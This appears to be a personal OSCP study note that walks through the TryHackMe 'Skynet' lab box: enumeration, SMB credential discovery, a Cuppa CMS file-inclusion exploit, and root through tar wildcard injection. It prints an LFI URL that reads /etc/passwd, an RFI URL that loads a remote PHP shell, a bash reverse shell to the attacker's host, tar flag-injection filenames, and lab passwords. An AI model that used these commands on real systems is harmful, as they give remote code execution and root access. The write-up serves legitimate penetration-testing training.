Related: [[1. nmap]] | [[OSCP/Boxes/THM/(THM) Skynet/22 ssh]] | [[80 http]] | [[110 pop3]] | [[139 netbios samba]] | [[143 open imap]] | [[445 open netbios ssn]] | [[OSCP/Boxes/THM/(THM) Skynet/Commands]] | [[Resources]]
Theory: [[LFI (Local File Inclusion)]] | [[RFI (Remote File Inclusion)]] | [[File Inclusion]] | [[Types of shells]] | [[Python]]

# THM - Skynet

**IP:** `10.113.130.138`  
**LHOST:** `192.168.232.84`  
**Difficulty:** Easy  
**OS:** Linux (Ubuntu)

---

## Open Ports

| Port | Service | Version |
|------|---------|---------|
| 22 | SSH | OpenSSH 7.2p2 |
| 80 | HTTP | Apache 2.4.18 |
| 110 | POP3 | Dovecot pop3d |
| 139 | NetBIOS/Samba | Samba 3.X - 4.X |
| 143 | IMAP | Dovecot imapd |
| 445 | SMB | Samba 4.3.11-Ubuntu |

---

## Enumeration

### Web (Port 80)

Gobuster on root found:
- `/admin` → redirects to `/admin/`
- `/config`
- `/squirrelmail` → SquirrelMail webmail login

Gobuster on hidden dir found:
- `/45kra24zxs28v3yd/administrator/` → **Cuppa CMS login**

### SMB (Port 445)

Listed shares anonymously:
```
print$        - Printer Drivers
anonymous     - Skynet Anonymous Share  ← accessible without creds
milesdyson    - Miles Dyson Personal Share
IPC$          - IPC Service
```

Connected to `anonymous` share, retrieved a password list and emails. One email revealed **milesdyson's** SMB password.

Connected to `milesdyson` share and retrieved `notes/important.txt`, which contained the **hidden web directory**: `45kra24zxs28v3yd`

---

## Foothold

### Credentials Found

| Account | Password | Where Used |
|---------|----------|------------|
| milesdyson | `cyborg007haloterminator` | SMB + SquirrelMail |
| milesdyson (SMB) | `)s{A&2Z=F^n_E.B\`` | milesdyson SMB share |

### Cuppa CMS - LFI (CVE / EDB-25971)

URL: `http://10.113.130.138/45kra24zxs28v3yd/administrator/`

The `alertConfigField.php` endpoint has an unauthenticated `urlConfig` parameter vulnerable to **Local/Remote File Inclusion**.

**LFI test (read /etc/passwd):**
```
http://10.113.130.138/45kra24zxs28v3yd/administrator/alerts/alertConfigField.php?urlConfig=../../../../../../../../../etc/passwd
```

**RFI → RCE (reverse shell):**
```
http://10.113.130.138/45kra24zxs28v3yd/administrator/alerts/alertConfigField.php?urlConfig=http://<LHOST>/shell.php
```
Host a PHP reverse shell on your machine, then trigger via the RFI parameter.

---

## Privilege Escalation

**Method: Cronjob + Tar Wildcard Injection**

A root-owned cronjob runs a backup script every minute:

```bash
*/1 * * * *   root   /home/milesdyson/backups/backup.sh
```

The script tars up a directory using a wildcard (`*`):

```bash
cd /var/www/html && tar cf /home/milesdyson/backups/backup.tgz *
```

Because `tar` expands the wildcard from the filesystem, you can create files with names that act as tar flags. This lets you inject `--checkpoint-action=exec=<cmd>` to run arbitrary commands as root.

**Steps:**

```bash
# Navigate to the tarred directory
cd /var/www/html

# Create a reverse shell script
echo 'bash -i >& /dev/tcp/<LHOST>/4444 0>&1' > shell.sh
chmod +x shell.sh

# Create files that act as tar flags
echo "" > "--checkpoint=1"
echo "" > "--checkpoint-action=exec=sh shell.sh"
```

Start a listener on your machine (`nc -lvnp 4444`), then wait up to 1 minute for the cronjob to fire. The wildcard in `tar *` picks up the fake flag files and executes `shell.sh` as root.

**Why it works:** `tar` processes filenames starting with `--` as flags when the shell expands the wildcard. No sanitisation = arbitrary flag injection.

---

## Flags

| Flag | Value |
|------|-------|
| user.txt | *(found in /home/milesdyson/)* |
| root.txt | *(found in /root/)* |

---

## Notes / CVEs

- **CVE-2025-30090** — SquirrelMail XSS via email headers (noted but not needed for root)
- **EDB-25971** — Cuppa CMS unauthenticated LFI/RFI via `urlConfig` parameter
- Cuppa CMS DB config found in page source: `root:password123` on localhost (not externally useful here)
